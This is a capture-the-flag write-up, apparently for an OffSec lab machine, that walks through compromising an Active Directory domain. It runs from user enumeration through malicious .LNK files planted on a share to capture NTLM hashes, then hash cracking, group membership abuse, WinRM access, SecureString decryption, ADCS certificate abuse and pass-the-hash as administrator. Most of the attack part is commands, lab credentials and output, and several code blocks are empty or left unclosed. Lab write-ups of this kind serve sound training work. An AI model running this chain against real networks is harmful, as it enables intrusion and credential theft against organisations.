Dear Team,

We hope this message finds you well. We wanted to remind all employees to take a moment each day to check the shared documents folder diligently. As part of our commitment to streamline processes and enhance efficiency, important documents are frequently uploaded to this folder for your attention and action.

The shared documents folder serves as a central hub for crucial updates, contracts, agreements, and various other essential materials requiring your attention. To ensure that you don't miss any critical information, please make it a habit to access the folder at the beginning of your workday or as often as possible.

> This text literally gave me the hint that we can actually place files in the `nara` share, You know what i am thinking ??..........NTLM Theft 😈.

- First of all i tried to enumerate users using the RID brute technique since we have `READ` access on the “Remote `IPC`” share.

```bash
❯ cme smb 192.168.209.30 -u guest -p "" --rid-brute | grep -i sidtypeuser | awk -F'\' '{print $2}' | cut -d '(' -f1 >> users.txt

❯ \cat users.txt

Guest 
krbtgt 
NARA$ 
Amelia.O'Brien 
Damian.Johnson 
Helen.Robinson 
Sara.O'Sullivan 
Jasmine.Roberts 
Declan.Reynolds 
Jodie.Summers 
Carolyn.Hill 
Jemma.Humphries 
Tracy.White
```

- Then as usual tried to try usernames as password, I mean leaving no stone un-turned, This is Offsec 😭🤲.

```bash
❯ cme smb 192.168.209.30 -u users.txt -p users.txt --no-bruteforce --continue-on-success

- That didn't turn out as expected so the next thing on my list is the ASREPRoasting attack which should be possible to get any user hash due to Kerberos pre-authentication required attribute enabled on an object.

```bash
❯ impacket-GetNPUsers nara-security.com/ -dc-ip 192.168.209.30 -usersfile users.txt -format hashcat -outputfile hashes.txt

```

- The last technique also didn't yield result as expected so i decided to run my kerbrute and enumerate users again just to be sure i am on the right path. But hehe, No users where discovered except from the `Administrator` and `Guest` user account which is as usual. 

```bash
❯ kerbrute userenum --dc 192.168.209.30 --domain nara-security.com /usr/share/wordlists/seclist/Usernames/xato-net-10-million-usernames.txt

```

- Moving on to the NTLM Theft technique i decided to use the [`ntlm_theft`](https://github.com/Greenwolf/ntlm_theft.git) tool from ***Green Wolf*** to exploit this by generating a malicious `.LNK` file that will get executed by the automated user in that share and then return their hashes. ( That is if there is any, but let try :] )

```bash
❯ python3 ntlm_theft.py -g all -s 192.168.45.235 -f test

```

- After generating i uploaded the `test.lnk` file to each directory in the share cos i don't know where the automation is taking place ☹️. 

```

- Then started up `responder` and hell yeah i got user `Tracy.White` hash which we discovered earlier.

```bash

> You can also use the [`Hashgrab`](https://github.com/xct/hashgrab) tool by ***`XCT`*** to generate the `.LNK` file, haven't tried it before but it is worth the try at least.

- EZPZ, Cracked this user hash and got the password with `JtR`

```bash

```

- The goal is to always password spray, I mean on a CTF not real world engagement 🤣🥹, and see if there are any other users using that same password. Unfortunately, Only the user `Tracy.White` which we have acquired uses that credential.

- The rule of thumb for me is always to load up bloodhound once i have valid credentials. So i use the `bloodhound-python` tool which uses LDAP to query domain information if you have valid set of credentials. You don't have to wait till you get foothold so you can run a SharpHound collector, Hell NO!!!!!!.

```bash
❯ bloodhound-python -u 'Tracy.White' -p 'zqwj041FGX' -ns 192.168.165.30 -d nara-security.com -c all --zip --dns-timeout 50

```

- Then uploaded the loot to bloodhound GUI and has shown below our user `Tracy.White` has `GenericAll` ACE to the **"Remote Access"** group. At least we would now be able to connect via `WinRM` or `RDP`  by adding our self to this groups respectively.


![](https://i.imgur.com/65sZKQh.png)


- We can carry out this operation by doing so, using the `net` tool on kali to add our self to the group and checking if this operation was successful.


```bash
# Add to group
❯ net rpc group addmem "REMOTE ACCESS" "Tracy.White" -U "nara-security.com"/"Tracy.White"%"zqwj041FGX" -S 192.168.165.30

# Confirm operation was successful
❯ net rpc group members "REMOTE ACCESS" -U "nara-security.com"/"Tracy.White"%"zqwj041FGX" -S 192.168.165.30

NARASEC\Jodie.Summers
NARASEC\Tracy.White
```

- We can then try to authenticate via `WinRM` using CrackMapExec and see if we truly have access <#. Yes we do!

```bash
❯ cme winrm 192.168.165.30 -u Tracy.White -p zqwj041FGX
SMB         192.168.165.30  5985   NARA             [*] Windows 10.0 Build 20348 (name:NARA) (domain:nara-security.com)

```

- So go ahead and login using the `evil-winrm` utility as user `Tracy.White` which should be successful.

```bash
❯ evil-winrm -i 192.168.165.30 -u Tracy.White -p zqwj041FGX

```


- Now we have to load Post-Exploitation tools like `WinPEAS`, `Snaffler`, `LaZagne`, `MimiKatz` etc to see what we have. However majority of this tools where blocked by AV so i started manual enumeration and found this `automation.txt` file.

```bash
*Evil-WinRM* PS C:\Users\tracy.white\Documents> dir


    Directory: C:\Users\tracy.white\Documents

```


- The content looked like a powershell secure string which is used to help protect confidential text.

```bash
*Evil-WinRM* PS C:\Users\tracy.white\Documents> type automation.txt
Enrollment Automation Account

01000000d08c9ddf0115d1118c7a00c04fc297eb0100000001e86ea0aa8c1e44ab231fbc46887c3a0000000002000000000003660000c000000010000000fc73b7bdae90b8b2526ada95774376ea0000000004800000a000000010000000b7a07aa1e5dc859485070026f64dc7a720000000b428e697d96a87698d170c47cd2fc676bdbd639d2503f9b8c46dfc3df4863a4314000000800204e38291e91f37bd84a3ddb0d6f97f9eea2b
```

- To decrypt this we can replicate the following steps

```bash
*Evil-WinRM* PS C:\Users\tracy.white\Documents> $user = "Enrollment Automation Account" # Not necessary a valid user if you don't have one

*Evil-WinRM* PS C:\Users\tracy.white\Documents> $pass = "01000000d08c9ddf0115d1118c7a00c04fc297eb0100000001e86ea0aa8c1e44ab231fbc46887c3a0000000002000000000003660000c000000010000000fc73b7bdae90b8b2526ada95774376ea0000000004800000a000000010000000b7a07aa1e5dc859485070026f64dc7a720000000b428e697d96a87698d170c47cd2fc676bdbd639d2503f9b8c46dfc3df4863a4314000000800204e38291e91f37bd84a3ddb0d6f97f9eea2b" | ConvertTo-SecureString

*Evil-WinRM* PS C:\Users\tracy.white\Documents> $cred = New-Object System.Management.Automation.PSCredential($user, $pass)

*Evil-WinRM* PS C:\Users\tracy.white\Documents> $cred.GetNetworkCredential() | fl


UserName       : Enrollment Automation Account
Password       : hHO_S9gff7ehXw
SecurePassword : System.Security.SecureString

```

- Now that we have the clear text password but don't know which account uses this password, we can go ahead and password spray and as shown below we got a hit on user `Jodie.Summers`

```bash

- I don't know what made me think about ADCS attacks but the **"Enrollment Automation Account"** already gave it away i think. so i decided to enumerate vulnerable certificates using the `certipy` tool. 

```bash

- However trying to request a certificate file `.pfx` i keep getting this error, although the goal is to keep trying till it works, but after numerous attempt this didn't work for me. I mean i just made this blog so you can understand how this works.

```bash
❯ certipy req -username JODIE.SUMMERS -password hHO_S9gff7ehXw -target nara-security.com -ca NARA-CA -template NaraUser -upn administrator@nara-security.com -dc-ip 192.168.220.30 -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

- If you want you can check this video of a friend exploiting the certificate template on a live stream by [Ye Zeiya Shein](https://www.youtube.com/watch?v=sQgsRfmMus8)

```bash
certipy auth -pfx administrator.pfx -domain nara-security.com -username administrator -dc-ip 192.168.220.30

# Gives administrator hash
```

- You can then pass-the-hash using the `evil-winrm` utility in kali as the user administrator

```bash
❯ evil-winrm -i 192.168.220.30 -u administrator -H d35c4ae45bdd10a4e28ff529a2155745
